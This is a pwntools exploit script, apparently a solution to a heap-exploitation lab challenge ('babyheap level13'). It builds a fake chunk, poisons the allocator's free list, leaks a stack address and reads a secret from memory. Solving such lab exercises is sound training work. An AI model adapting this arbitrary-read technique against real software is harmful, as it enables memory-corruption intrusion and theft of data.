# idea: stack_scanf -> stack_free -> malloc * 2 -> free * 2 -> puts -> get stack_free address leak
# malloc next to be secret addr -> puts

from pwn import *

p = process("/challenge/babyheap_level13.0")
#p = gdb.debug("/challenge/babyheap_level12.0")

def malloc_to_1(loc:bytes):
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'80')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'80')
    p.sendline(b'free')
    p.sendline(b'0')
    p.sendline(b'free')
    p.sendline(b'1')

    p.sendline(b'scanf')
    p.sendline(b'1')
    p.recv()
    p.sendline(loc)
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'80')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'80')

def scanf_to_pos(buf:bytes, pos:bytes):
    p.sendline(b'scanf')
    p.sendline(pos)
    p.recv()
    p.sendline(buf)
    p.recv()

print(p.recv())
# leak stack addr
fake_chunk = p64(0x0) + p64(0x61) + p64(0x0) + p64(0x0)
# stack_scanf + 0x40 = stack_free
p.sendline(b'stack_scanf')
p.recv()
p.sendline(b'A' * 0x30 + fake_chunk)
p.recv()
p.sendline(b'stack_free')
p.sendline(b'malloc')
p.sendline(b'0')
p.sendline(b'80')
p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'80')
p.sendline(b'free')
p.sendline(b'0')
p.sendline(b'free')
p.sendline(b'1')

p.sendline(b'puts')
p.sendline(b'1')
p.recvuntil(b'Data: ')
stack_free_addr = unpack(p.recvuntil(b'\n')[:-1], 'all')
secret_addr = stack_free_addr + 0xbc

# push secret addr to next chunk
secret = b''
#malloc_to_1(p64(secret_addr))
#p.sendline(b'puts')
#p.sendline(b'1')
#p.recvuntil(b'Data: ')
#secret += p.recvuntil(b'\n')[:-1]

malloc_to_1(p64(secret_addr+0x8))
p.sendline(b'puts')
p.sendline(b'1')
p.recvuntil(b'Data: ')
secret += p.recvuntil(b'\n')[:-1]

print(secret)

p.interactive()

